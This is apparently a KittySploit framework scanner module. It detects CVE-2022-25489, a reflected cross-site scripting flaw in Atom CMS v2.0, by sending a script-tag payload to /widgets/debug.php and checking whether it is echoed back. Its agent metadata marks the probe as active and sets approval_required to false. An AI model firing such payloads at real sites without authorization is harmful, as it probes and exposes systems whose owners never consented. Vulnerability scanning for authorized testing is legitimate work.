#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Atom CMS v2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Atom CMS v2.0 - Cross-Site Scripting Detection',
        'description': 'Atom CMS v2.0 was discovered to contain a reflected cross-site scripting (XSS) vulnerability via the "A" parameter in /widgets/debug.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'atom', 'cms', 'thedigitalcraft', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/thedigicraft/Atom.CMS/issues/258',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-25489',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-25489',
    }

    def run(self):
        r = self.http_request(method="GET", path='/widgets/debug.php?a=<script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script>', 'Path Array', 'console-debug',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Atom CMS v2.0 - Cross-Site Scripting detected",
                path='/widgets/debug.php?a=<script>alert(document.domain)</script>',
            )
            return True
        return False

